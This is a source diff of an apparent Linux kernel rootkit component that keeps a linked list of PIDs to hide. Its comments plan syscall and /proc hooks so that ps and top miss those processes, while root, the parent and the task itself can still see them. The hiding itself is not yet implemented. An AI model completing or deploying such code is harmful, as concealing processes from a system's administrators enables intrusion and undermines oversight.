@@ -20,97 +20,129 @@
 // TODO: Not done yet. How should be done? Every syscall that implies asking
 // something about a tasks (i.e. each syscall with a PID as parameter, but not
 // just those. What about syscalls that acts on every tasks?) should be
-// patched/hooked/hijacked so they check the PIDs inside the hidden_tasks list
-// and if the PID requested is inside the list then return an error (ESRCH,
-// check man errno).
+// patched/hooked/hijacked so they check the PIDs inside the list and if the
+// PID requested is inside the list then return an error (ESRCH, check man
+// errno).
+
+// TODO: There is another interesting problem we need to handle, if a PID is
+// hide and then that program ends its execution we need to take care of that
+// and remove it from the list. If we don't there would be a nasty problem when
+// the PIDs wraps around.
+
+// TODO: There's much more to do, not only hook syscalls with pids, for example
+// ps, top and all this process-related utilities use /proc interface to get
+// information about tasks, so every syscall that deals with /proc should also
+// be hooked.
+
+#include <linux/types.h>
+#include <linux/slab.h>
+#include <linux/sched.h>
+#include <linux/pid.h>
 
 #include "hideproc.h"
+#include "funcs.h"
 #include "debug.h"
 
-#define MAX_HIDDEN_TASKS (3)
-
-// TODO: Just as PoC we use a stupid static array of PIDs to know which tasks
-// should be hidden. Of course this should change to a dynamic list.
-pid_t hidden_tasks[MAX_HIDDEN_TASKS];
+struct hide_pid {
+	struct list_head list;
+	pid_t pid;
+} hide_pids_list;
 
 /***
- * For debugging purposes.
+ * For debugging purposes. Prints the list of PIDs.
  */
-void print_hidden_tasks(void) {
-	int i;
+void print_hide_tasks(void) {
+	struct list_head *pos;
+	struct hide_pid *curr;
 
 	debug("hidden_tasks: [");
-	for (i=0; i<MAX_HIDDEN_TASKS; i++)
-		debug("%d, ", hidden_tasks[i]);
+	list_for_each(pos, &hide_pids_list.list) {
+		curr = list_entry(pos, struct hide_pid, list);
+		debug("%d, ", curr->pid);
+	}
 
 	debug("]\n");
 	return;
 }
 
-int init_hideproc() {
-	int res = -1;
-	int i;
+void init_hideproc() {
+	INIT_LIST_HEAD(&hide_pids_list.list);
+}
 
-	// Initializes the whole list to -1 (no tasks being hidden).
-	for (i=0; i<MAX_HIDDEN_TASKS; i++)
-		hidden_tasks[i] = -1;
-
-	res = 0;
-	return res;
+void exit_hideproc() {
+	struct list_head *pos, *n;
+	struct hide_pid *curr;
+	
+	// Free all the memory taken for the active hidden PIDs.
+	list_for_each_safe(pos, n, &hide_pids_list.list) {
+		curr = list_entry(pos, struct hide_pid, list);
+		list_del(pos);
+		kfree(curr);
+	}
 }
 
 int hideProc(pid_t pid) {
 	int res = -1;
-	int i;
+	struct hide_pid *tmp;
 
-	for (i=0; i<MAX_HIDDEN_TASKS; i++)
-		// First free position found.
-		if (hidden_tasks[i] == -1) {
-			hidden_tasks[i] = pid;
-			break;
-		}
+	// Allocate a new struct hide_pid structure to maintain this new PID, of
+	// just if it wasn't previously hide.
+	if (!isProcHidden(pid)) {
+		tmp = (struct hide_pid *)kmalloc(sizeof(struct hide_pid), GFP_KERNEL);
+		tmp->pid = pid;
+		list_add(&(tmp->list), &(hide_pids_list.list));
+		res = 0;
+	}
 
-	print_hidden_tasks();
+	print_hide_tasks();
 	return res;
 }
 
 int stopHideProc(pid_t pid) {
 	int res = -1;
-	int i, j;
-
-	for (i=0; i<MAX_HIDDEN_TASKS; i++) {
-		// PID found.
-		if (hidden_tasks[i] == pid) {
-			// If the PID is the last element of the list or it has no more
-			// subsequent PIDs just clear this position.
-			if (i == MAX_HIDDEN_TASKS-1 || hidden_tasks[i+1] == -1)
-				hidden_tasks[i] = -1;
-			// This element has subsequent PIDs, we must move all of them to
-			// the left and in the last position a -1 must be pushed.
-			else {
-				j = i+1;
-				while (j < MAX_HIDDEN_TASKS) {
-					if (hidden_tasks[j] != -1) {
-						hidden_tasks[j-1] = hidden_tasks[j];
-						hidden_tasks[j] = -1;
-					}
-					else
-						hidden_tasks[j-1] = -1;
-					j++;
-				}
-			}
-
+	struct list_head *pos, *n;
+	struct hide_pid *curr;
+	
+	// Search the PID passed inside the list, if we find it then remove it from
+	// the list and free that chuck of memory allocated when the PID was hid.
+	list_for_each_safe(pos, n, &hide_pids_list.list) {
+		curr = list_entry(pos, struct hide_pid, list);
+		if (curr->pid == pid) {
+			list_del(pos);
+			kfree(curr);
 			res = 0;
-			break;
 		}
-		// PID not inside the list.
-		else if (hidden_tasks[i] == -1)
-			break;
 	}
 
-	print_hidden_tasks();
+	print_hide_tasks();
 	return res;
 }
 
+int isProcHidden(pid_t pid) {
+	struct list_head *pos;
+	struct hide_pid *curr;
+	struct task_struct *tsk;
+	int res = 0;
 
-algo
+	// Iterate over the list searching the PID passed.
+	list_for_each(pos, &hide_pids_list.list) {
+		curr = list_entry(pos, struct hide_pid, list);
+		if (curr->pid == pid)
+			res = 1;
+	}
+
+	// TODO: Right now root can find every task, of course this would change
+	// in the future.
+	// Even a task being hidden is revealed if one of these conditions meet:
+	// - The task is looking for itself.
+	// - The parent is asking for a hide child.
+	// - Root is looking for it (root privileges in fact).
+	tsk = get_task_by_pid(pid);
+	if (tsk != NULL)
+		if (current == tsk || current == tsk->parent ||
+			current->cred->euid == 0)
+				res = 0;
+
+	return res;
+}
+
